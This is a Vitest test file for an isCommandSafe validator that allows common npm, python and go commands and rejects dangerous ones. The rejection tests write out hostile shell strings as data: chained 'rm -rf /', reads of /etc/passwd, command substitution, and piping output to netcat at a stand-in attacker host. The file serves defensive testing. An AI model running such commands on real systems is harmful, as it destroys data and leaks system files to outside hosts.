/**
 * Backpressure 系统测试
 */

import { describe, it, expect } from 'vitest';
import { isCommandSafe } from './backpressure.js';

describe('isCommandSafe', () => {
  it('should allow npm commands', () => {
    expect(isCommandSafe('npm test')).toBe(true);
    expect(isCommandSafe('npm run build')).toBe(true);
    expect(isCommandSafe('npm install')).toBe(true);
  });
  
  it('should allow python commands', () => {
    expect(isCommandSafe('python -m pytest')).toBe(true);
    expect(isCommandSafe('python3 -m unittest')).toBe(true);
    expect(isCommandSafe('pip install requests')).toBe(true);
  });
  
  it('should allow go commands', () => {
    expect(isCommandSafe('go test ./...')).toBe(true);
    expect(isCommandSafe('go build')).toBe(true);
  });
  
  it('should reject commands with dangerous patterns', () => {
    expect(isCommandSafe('npm test; rm -rf /')).toBe(false);
    expect(isCommandSafe('npm test && cat /etc/passwd')).toBe(false);
    expect(isCommandSafe('npm test | nc attacker.com 1234')).toBe(false);
    expect(isCommandSafe('$(cat /etc/passwd)')).toBe(false);
  });
  
  it('should reject rm -rf commands', () => {
    expect(isCommandSafe('rm -rf /')).toBe(false);
    expect(isCommandSafe('rm -rf ~')).toBe(false);
  });
  
  it('should reject sudo commands', () => {
    expect(isCommandSafe('sudo npm test')).toBe(false);
  });
  
  it('should reject chmod 777', () => {
    expect(isCommandSafe('chmod 777 /tmp')).toBe(false);
  });
  
  it('should reject unknown commands', () => {
    expect(isCommandSafe('unknown-command')).toBe(false);
    expect(isCommandSafe('/bin/bash')).toBe(false);
  });
});